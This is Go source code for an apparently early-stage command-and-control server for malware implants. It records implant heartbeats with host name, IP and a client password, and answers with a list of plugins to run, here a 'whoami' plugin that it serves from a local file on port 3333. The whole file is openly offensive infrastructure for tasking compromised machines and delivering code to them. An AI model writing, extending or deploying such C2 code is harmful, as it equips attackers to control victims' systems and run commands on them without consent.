package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"time"
)

// This server should:
// * Receive and handle connections from implant
// * Serve plugins to implants

type Implant struct {
	HostName           string
	LastKnownIp        string
	LastKnownHeartBeat time.Time
	PluginsToLoad      []string
}

type PluginsFromC2 []struct {
	PluginID   string `json:"pluginId"`
	PluginURL  string `json:"pluginUrl"`
	PluginName string `json:"pluginName"`
}

var implants []Implant

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func postHeartbeat(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	CheckError(err)
	code := r.Form.Get("client_password")
	fmt.Println("Got client with code: " + code)
	io.WriteString(w, "[{\"pluginId\":\"PLUGINTEST\",\"pluginUrl\":\"\",\"pluginName\":\"whoami\"}]")
}

func postPlugin(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("got plugin request\n")
	err := r.ParseForm()
	CheckError(err)
	content, err := ioutil.ReadFile("test_whoami_plugin.txt") // the file is inside the local directory
	CheckError(err)
	io.WriteString(w, string(content))
}

func main() {
	http.HandleFunc("/", postHeartbeat)
	http.HandleFunc("/plugin/", postPlugin)

	err := http.ListenAndServe(":3333", nil)
	CheckError(err)
}
